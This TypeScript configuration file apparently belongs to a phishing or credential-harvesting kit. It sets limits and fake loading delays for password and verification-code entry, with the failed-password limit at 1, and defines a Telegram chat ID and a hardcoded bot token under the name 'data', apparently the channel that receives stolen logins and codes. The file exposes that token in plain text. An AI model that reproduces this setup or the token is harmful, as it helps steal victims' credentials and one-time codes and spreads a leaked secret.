interface Config {
	settings: {
		code_loading_time: number;
		max_failed_code_attempts: number;
		max_failed_password_attempts: number;
		password_loading_time: number;
	};
	telegram: {
		data_chatid: string;
		data_token: string;
	};
}
const defaultConfig: Config = {
	settings: {
		code_loading_time: 5000,
		max_failed_code_attempts: 30,
		max_failed_password_attempts: 1,
		password_loading_time: 5000,
	},
	telegram: {
		data_chatid: "2020004370",
		data_token: "7851840533:AAFxr9hBkzc4TYHME4c1BfEvS_9i6GGH5o8",
	},
};
const getConfig = (): Config => {
	return defaultConfig;
};

export default getConfig;
